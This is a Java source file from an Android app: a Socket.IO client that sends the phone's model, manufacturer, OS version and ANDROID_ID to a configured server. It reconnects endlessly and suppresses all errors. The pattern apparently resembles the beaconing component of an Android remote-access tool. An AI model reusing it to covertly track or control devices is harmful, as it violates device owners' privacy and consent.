package com.fason.app.core.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;

import com.fason.app.core.FasonApp;
import com.fason.app.core.config.Config;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

import io.socket.client.IO;
import io.socket.client.Socket;

// Socket connection manager
public final class SocketClient {

    private static final SocketClient INSTANCE = new SocketClient();
    private static final int RECONNECT_DELAY = 5000;

    private Socket socket;
    private ConnectivityManager.NetworkCallback networkCallback;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private volatile boolean connected = false;

    private SocketClient() {
        init();
        setupNetworkMonitor();
    }

    // Initialize socket connection
    private synchronized void init() {
        try {
            String deviceId = Settings.Secure.getString(
                FasonApp.getContext().getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            if (deviceId == null) deviceId = "unknown";

            String query = String.format("model=%s&manf=%s&release=%s&id=%s",
                encode(Build.MODEL),
                encode(Build.MANUFACTURER),
                encode(Build.VERSION.RELEASE),
                encode(deviceId));

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = RECONNECT_DELAY;
            opts.reconnectionDelayMax = 30000;
            opts.timeout = 30000;
            opts.query = query;
            opts.secure = Config.isHttps();

            socket = IO.socket(Config.getServerUrl(), opts);

            socket.on(Socket.EVENT_CONNECT, args -> connected = true);
            socket.on(Socket.EVENT_DISCONNECT, args -> connected = false);
            socket.on(Socket.EVENT_CONNECT_ERROR, args -> connected = false);

        } catch (Exception ignored) {}
    }

    // Monitor network changes
    private void setupNetworkMonitor() {
        ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
            .getSystemService(Context.CONNECTIVITY_SERVICE);

        if (cm == null) return;

        NetworkRequest req = new NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build();

        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                // Network available, try connect
                handler.postDelayed(() -> {
                    if (socket != null && !socket.connected()) {
                        try { socket.connect(); } catch (Exception ignored) {}
                    }
                }, 1000);
            }
        };

        try {
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    // URL encode helper
    private String encode(String s) {
        try {
            return URLEncoder.encode(s != null ? s : "", StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return s != null ? s : "";
        }
    }

    // Get singleton instance
    public static SocketClient getInstance() {
        return INSTANCE;
    }

    // Get socket connection
    public synchronized Socket getSocket() {
        if (socket == null) init();
        return socket;
    }

    // Check if connected
    public boolean isConnected() {
        return connected && socket != null && socket.connected();
    }

    // Manual reconnect
    public void reconnect() {
        if (socket != null) {
            try { socket.connect(); } catch (Exception ignored) {}
        }
    }

    // Disconnect socket
    public void disconnect() {
        if (socket != null) {
            try { socket.disconnect(); } catch (Exception ignored) {}
        }
    }
}
